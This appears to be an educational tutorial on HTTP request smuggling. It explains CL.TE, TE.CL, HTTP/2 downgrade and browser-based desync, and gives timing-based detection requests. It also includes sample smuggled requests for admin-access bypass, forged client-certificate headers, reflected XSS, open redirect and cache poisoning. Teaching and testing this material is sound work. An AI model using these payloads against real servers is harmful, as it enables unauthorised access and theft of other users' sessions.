# What is HTTP request smuggling ?

## 1. Introduction

HTTP Request Smuggling is a high-severity web vulnerability that occurs when a front-end server and a back-end server interpret the boundaries of an HTTP request differently.

This desynchronization allows an attacker to "smuggle" a hidden request inside another request. The back-end server processes this hidden request as a separate request, often bypassing security controls.

Request smuggling is most common in:

* Reverse proxy architectures
* Load balancer setups
* Cloud-based multi-tier systems
* HTTP/2 downgrading environments

***

## 2. Understanding the Architecture

Most modern applications use:

Client → Front-end server (Reverse proxy / Load balancer) → Back-end server

The front-end receives the request and forwards it to the back-end.

To do this efficiently, multiple HTTP requests are often sent over the same TCP connection.

This makes it extremely important that:

> Both front-end and back-end agree on where each request ends.

If they disagree → desynchronization occurs → request smuggling becomes possible.

***

## 3. How Does HTTP Define Request Length?

In HTTP/1.1, there are two ways to specify request body length:

***

### 3.1 Content-Length Header

```
POST /search HTTP/1.1
Host: example.com
Content-Length: 11

q=smuggling
```

The server reads exactly 11 bytes from the body.

***

### 3.2 Transfer-Encoding: chunked

```
POST /search HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

b
q=smuggling
0
```

Each chunk starts with a hex length.\
The request ends when a chunk of size 0 is received.

***

## 4. Why Does Request Smuggling Happen?

The HTTP/1 specification states:

If both Content-Length and Transfer-Encoding are present, Content-Length must be ignored.

However, in real-world environments:

* Some front-end servers use Content-Length
* Some back-end servers use Transfer-Encoding
* Some implementations parse headers differently

This disagreement causes desynchronization.

***

## 5. Classic Request Smuggling Variants

***

### 5.1 CL.TE Vulnerability

Front-end → Uses Content-Length\
Back-end → Uses Transfer-Encoding

Example:

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end reads 13 bytes and forwards everything.

Back-end processes:

```
0
```

This terminates the chunked body.

The remaining:

```
SMUGGLED
```

Is treated as the next request.

***

### 5.2 TE.CL Vulnerability

Front-end → Uses Transfer-Encoding\
Back-end → Uses Content-Length

Example:

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Front-end reads based on chunked encoding.

Back-end reads only 3 bytes.

Remaining data becomes a new request.

***

### 5.3 TE.TE Vulnerability

Both servers support Transfer-Encoding, but one ignores it due to header obfuscation:

Examples:

```
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: xchunked
```

One server processes it, the other ignores it → desync.

***

## 6. Detecting Request Smuggling (Timing Technique)

The safest detection method is timing-based detection.

If desync occurs, the back-end waits for more data, causing response delay.

***

### Detecting CL.TE

```
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Back-end expects another chunk and waits → delay confirms vulnerability.

***

### Detecting TE.CL

```
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Back-end waits for more body data → delay confirms vulnerability.

***

## 7. Exploiting Request Smuggling

***

### 7.1 Bypassing Front-End Access Controls

If front-end blocks `/admin` but allows `/home`, we can smuggle:

```
POST /home HTTP/1.1
Host: vulnerable.com
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

Front-end sees only `/home`.

Back-end sees `/admin`.

Access control bypass achieved.

***

### 7.2 Revealing Front-End Header Rewriting

Front-end often adds headers:

* X-Forwarded-For
* X-SSL-CLIENT-CN
* X-TLS-Version

Using a reflected parameter, you can smuggle a request and cause the rewritten headers to be reflected in the response.

This reveals internal infrastructure details.

***

### 7.3 Bypassing Client Certificate Authentication

If front-end adds:

```
X-SSL-CLIENT-CN: carlos
```

Back-end may trust it.

Smuggled request:

```
GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
```

Back-end grants admin access.

***

### 7.4 Capturing Other Users’ Requests

By sending a request with an overly large Content-Length:

```
Content-Length: 400
```

But sending only 150 bytes, the back-end waits.

Next user’s request is appended.

Their cookies or session tokens can be captured in stored content.

***

### 7.5 Delivering Reflected XSS

Smuggle:

```
GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
```

Next user receives the payload in response.

No social engineering required.

***

### 7.6 Open Redirect

Smuggle:

```
GET /home HTTP/1.1
Host: attacker.com
```

Next user gets redirected to attacker site.

***

### 7.7 Web Cache Poisoning

Smuggle a malicious redirect response and poison cached static resources.

All future users are affected.

***

### 7.8 Web Cache Deception

Smuggle request for:

```
GET /private/messages
```

Victim’s session data is cached as a static file.

Attacker retrieves it from cache.

***

## 8. Advanced HTTP/2 Request Smuggling

HTTP/2 uses binary frames and appears secure.

However, downgrading to HTTP/1 reintroduces risk.

***

### 8.1 H2.CL Vulnerability

HTTP/2 request includes misleading:

```
content-length: 0
```

Front-end trusts frame length.

Back-end trusts injected Content-Length.

Desync occurs.

***

### 8.2 H2.TE Vulnerability

Inject:

```
transfer-encoding: chunked
```

If not stripped during downgrade, smuggling is possible.

***

### 8.3 CRLF Injection in HTTP/2

HTTP/2 allows:

```
foo: bar\r\nTransfer-Encoding: chunked
```

Converted to HTTP/1 as:

```
Foo: bar
Transfer-Encoding: chunked
```

Header injection achieved.

***

## 9. Browser-Powered Request Smuggling

Traditional attacks require malformed requests.

Browser-powered attacks use fully valid browser-compatible requests.

***

### 9.1 CL.0 Smuggling

Back-end ignores Content-Length and ignores body.

Body becomes next request.

Works without chunked encoding.

***

### 9.2 Client-Side Desync

Victim’s browser poisons its own persistent connection.

Next request from victim is corrupted.

Allows:

* Account takeover
* XSS
* Intranet attacks
* Single-server exploitation

***

### 9.3 Pause-Based Desync

Send headers with Content-Length but pause before sending body.

Some servers respond early or desync.

Hidden vulnerabilities revealed.

***

## 10. Why HTTP Request Smuggling Is Critical

Request smuggling can lead to:

* Authentication bypass
* Full admin takeover
* Session hijacking
* Persistent cache poisoning
* Stored XSS
* Cross-user data theft
* Internal infrastructure disclosure

This is why it is often rated **Critical severity** in bug bounty programs.

***

## 11. Key Takeaway

Request smuggling is fundamentally about:

> Exploiting disagreement between two systems about where a request ends.

Whether through:

* CL.TE
* TE.CL
* HTTP/2 downgrading
* CL.0
* Browser desync

The root cause is always desynchronization.
